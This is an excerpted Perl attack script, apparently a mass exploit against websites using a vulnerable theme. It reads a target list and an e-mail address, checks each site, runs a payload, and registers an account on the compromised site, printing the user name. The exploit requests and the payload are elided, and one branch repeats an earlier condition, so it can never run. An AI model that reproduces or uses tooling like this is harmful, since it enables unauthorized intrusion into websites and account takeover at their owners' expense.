...
print color 'reset';
chomp (my $list=<>);
print color("bold Blue"), "[+] Enter E-mail : ";
print color 'reset';
chomp (my $mail=<>);
...
sub Work {
    ...
    print color("Bold Green"), "[Yes] Theme Obtained\n";
    ...
    my $e = length($html);
    if ($e eq 0) {
        print color("Bold Green"), "[Yes] Target Infected\n";
print color 'reset';
        Exp($x);
    }
    elsif ($e eq 0){
        print color("Bold Red"), "[!] Forbiden 404\n\n"

    }
    else {
        print color("Bold Red"), "[!] Target Not Infected\n\n"
    }
...
sub Exp {
    ...
    if ($search->content=~/success/) {
        print color("Bold Green"), "[OK]  Payload successfully executed\n";
print color 'reset';
        my $web=clean($_[0]);
        Exploiting($web);
    }
    else {print color("Bold Red"), "[No]  Faild To Execute Payload \n\n";}
	print color 'reset';
}
    ...
    if ($xx->content=~/$regex/){
        if (defined $1){
            ...
            if (length($post->content) eq 0 || $post->code eq 302) {
                print color ("bold Green"), "[d0ne] Account Successfully Created \n";
                print "[!] User : $user \n";
                print "[!] Password : Check your e-mail \n\n";
print color 'reset';
            }
            else {print color("Bold Green"), "[No] Error Creating Account \n\n";}
print color 'reset';
        }
        else {
            print color("Bold Green"), "[No] Can't get register value try to make it manually\n";
            print "[.] To registre :\n";
            print " -> $y\n\n";
print color 'reset';
        }
